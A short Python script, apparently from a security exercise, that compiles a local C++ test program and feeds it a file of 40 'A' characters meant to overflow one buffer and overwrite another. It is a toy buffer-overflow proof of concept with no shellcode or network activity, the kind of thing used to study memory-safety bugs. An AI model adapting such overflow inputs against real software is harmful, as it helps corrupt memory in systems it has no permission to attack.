```python
import os
# Compile the program
os.system('g++ -g test3.cpp -o test3')
# Create an input file with payload to overflow buffer1 and overwrite buffer2
with open('input.txt', 'w') as f:
    f.write('A' * 40 + '\n')
# Execute the program with the crafted input
os.system('./test3 input.txt')
```